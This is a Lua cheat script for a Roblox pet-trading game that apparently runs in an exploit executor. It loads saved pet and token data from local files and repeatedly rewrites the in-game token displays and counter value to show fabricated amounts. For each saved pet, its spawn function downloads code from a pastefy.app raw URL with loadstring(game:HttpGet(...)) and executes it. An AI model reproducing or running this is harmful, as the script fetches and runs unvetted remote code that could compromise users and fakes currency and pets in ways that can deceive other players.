local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local plr = Players.LocalPlayer
local pgui = plr:WaitForChild("PlayerGui")

local PETS_FILE = "SavedPets.json"
local TOKENS_FILE = "SavedTokens.json"
local HOLD_ANIMATION_ID = "rbxassetid://79220061824163"
local TRACKED_PETS = {"Rhino", "T-Rex", "Phoenix", "Kitsune", "Headless Horseman"}

local loadedPets = {}
local loadedTokens = {}
local currentHoldTrack = nil

local function cleanPetName(toolName)
	local cleanName = toolName:gsub("%s*%[.-%]", "")
	return cleanName:match("^%s*(.-)%s*$")
end

local function isTrackedPet(petName)
	for _, trackedName in ipairs(TRACKED_PETS) do
		if petName == trackedName then
			return true
		end
	end
	return false
end

local function loadHoldAnimation(character)
	local humanoid = character:FindFirstChildOfClass("Humanoid")
	if not humanoid then return nil end
	
	local holdAnim = Instance.new("Animation")
	holdAnim.AnimationId = HOLD_ANIMATION_ID
	
	local animTrack = humanoid:LoadAnimation(holdAnim)
	return animTrack
end

local function onToolEquipped(tool)
	local toolName = tool.Name
	local petName = cleanPetName(toolName)
	
	if not isTrackedPet(petName) then return end
	
	local character = plr.Character
	if not character then return end
	
	if currentHoldTrack then
		currentHoldTrack:Stop()
		currentHoldTrack = nil
	end
	
	currentHoldTrack = loadHoldAnimation(character)
	if currentHoldTrack then
		currentHoldTrack:Play()
		currentHoldTrack.Looped = true
	end
end

local function onToolUnequipped()
	if currentHoldTrack then
		currentHoldTrack:Stop()
		currentHoldTrack = nil
	end
end

local function setupToolTracking()
	local character = plr.Character or plr.CharacterAdded:Wait()
	
	character.ChildAdded:Connect(function(child)
		if child:IsA("Tool") then
			onToolEquipped(child)
			
			child.Unequipped:Connect(function()
				onToolUnequipped()
			end)
		end
	end)
	
	character.ChildRemoved:Connect(function(child)
		if child:IsA("Tool") then
			onToolUnequipped()
		end
	end)
	
	for _, child in pairs(character:GetChildren()) do
		if child:IsA("Tool") then
			onToolEquipped(child)
		end
	end
end

plr.CharacterAdded:Connect(setupToolTracking)
if plr.Character then
	setupToolTracking()
end

local function loadPetsFromFile()
    local success, result = pcall(function()
        if isfile(PETS_FILE) then
            local data = readfile(PETS_FILE)
            return HttpService:JSONDecode(data)
        end
        return {}
    end)
    
    if success and result then
        loadedPets = result
        return result
    else
        return {}
    end
end

local function loadTokensFromFile()
    local success, result = pcall(function()
        if isfile(TOKENS_FILE) then
            local data = readfile(TOKENS_FILE)
            return HttpService:JSONDecode(data)
        end
        return {current = 0, totalEarned = 0, totalSpent = 0}
    end)
    
    if success and result then
        loadedTokens = result
        return result
    else
        return {current = 0, totalEarned = 0, totalSpent = 0}
    end
end

local function setTokensInGame(amount)
    local tokenLabel1 = pgui:FindFirstChild("TradeBooth")
    if tokenLabel1 then
        tokenLabel1 = tokenLabel1:FindFirstChild("Frame")
        if tokenLabel1 then
            tokenLabel1 = tokenLabel1:FindFirstChild("TokenCounter")
            if tokenLabel1 then
                tokenLabel1 = tokenLabel1:FindFirstChild("Label")
                if tokenLabel1 and tokenLabel1:IsA("TextLabel") then
                    tokenLabel1.Text = "Tokens: " .. amount
                end
            end
        end
    end
    
    local tokenLabel2 = pgui:FindFirstChild("BuyTokens")
    if tokenLabel2 then
        tokenLabel2 = tokenLabel2:FindFirstChild("Frame")
        if tokenLabel2 then
            tokenLabel2 = tokenLabel2:FindFirstChild("Label")
            if tokenLabel2 and tokenLabel2:IsA("TextLabel") then
                tokenLabel2.Text = "Tokens: " .. amount
            end
        end
    end
    
    local valNumberValue = pgui:FindFirstChild("TradeTokenCurrency_UI")
    if valNumberValue then
        valNumberValue = valNumberValue:FindFirstChild("TradeTokens")
        if valNumberValue then
            valNumberValue = valNumberValue:FindFirstChild("TextLabel1")
            if valNumberValue then
                valNumberValue = valNumberValue:FindFirstChild("val")
                if valNumberValue and valNumberValue:IsA("NumberValue") then
                    valNumberValue.Value = amount
                end
            end
        end
    end
end

local function updateTokensRealtime(amount)
    setTokensInGame(amount)
    
    RunService.RenderStepped:Connect(function()
        local valNumberValue = pgui:FindFirstChild("TradeTokenCurrency_UI")
        if valNumberValue then
            valNumberValue = valNumberValue:FindFirstChild("TradeTokens")
            if valNumberValue then
                valNumberValue = valNumberValue:FindFirstChild("TextLabel1")
                if valNumberValue then
                    valNumberValue = valNumberValue:FindFirstChild("val")
                    if valNumberValue and valNumberValue:IsA("NumberValue") then
                        local currentTokens = valNumberValue.Value
                        
                        local tokenLabel1 = pgui:FindFirstChild("TradeBooth")
                        if tokenLabel1 then
                            tokenLabel1 = tokenLabel1:FindFirstChild("Frame")
                            if tokenLabel1 then
                                tokenLabel1 = tokenLabel1:FindFirstChild("TokenCounter")
                                if tokenLabel1 then
                                    tokenLabel1 = tokenLabel1:FindFirstChild("Label")
                                    if tokenLabel1 and tokenLabel1:IsA("TextLabel") then
                                        tokenLabel1.Text = "Tokens: " .. currentTokens
                                    end
                                end
                            end
                        end
                        
                        local tokenLabel2 = pgui:FindFirstChild("BuyTokens")
                        if tokenLabel2 then
                            tokenLabel2 = tokenLabel2:FindFirstChild("Frame")
                            if tokenLabel2 then
                                tokenLabel2 = tokenLabel2:FindFirstChild("Label")
                                if tokenLabel2 and tokenLabel2:IsA("TextLabel") then
                                    tokenLabel2.Text = "Tokens: " .. currentTokens
                                end
                            end
                        end
                    end
                end
            end
        end
    end)
end

local function spawnPetInGame(petConfig)
    pcall(function()
        loadstring(game:HttpGet("https://pastefy.app/KG5c5jX7/raw"))()
    end)
    
    task.wait(0.5)
    
    if _G.SpawnPet then
        _G.SpawnPet(petConfig.name, petConfig.weight, petConfig.age)
    end
end

local function spawnAllLoadedPets()
    for i, petConfig in ipairs(loadedPets) do
        spawnPetInGame(petConfig)
        
        if i < #loadedPets then
            task.wait(1.2)
        end
    end
end

local function displayLoadedData()
    local totalPets = #loadedPets
    local tokens = loadedTokens.current or 0
    local earned = loadedTokens.totalEarned or 0
    local spent = loadedTokens.totalSpent or 0
    
    local petsByType = {}
    for _, pet in ipairs(loadedPets) do
        petsByType[pet.name] = (petsByType[pet.name] or 0) + 1
    end
end

local function autoLoadAndRestore()
    task.wait(2)
    
    local pets = loadPetsFromFile()
    local tokens = loadTokensFromFile()
    
    loadedPets = pets
    loadedTokens = tokens
    
    if tokens.current and tokens.current > 0 then
        task.wait(1)
        updateTokensRealtime(tokens.current)
    end
    
    displayLoadedData()
    
    if #pets > 0 then
        task.wait(2)
        spawnAllLoadedPets()
    end
end

_G.LoadData = autoLoadAndRestore
_G.GetLoadedPets = function() return loadedPets end
_G.GetLoadedTokens = function() return loadedTokens end
_G.SpawnAllPets = spawnAllLoadedPets
_G.SetTokens = setTokensInGame

autoLoadAndRestore()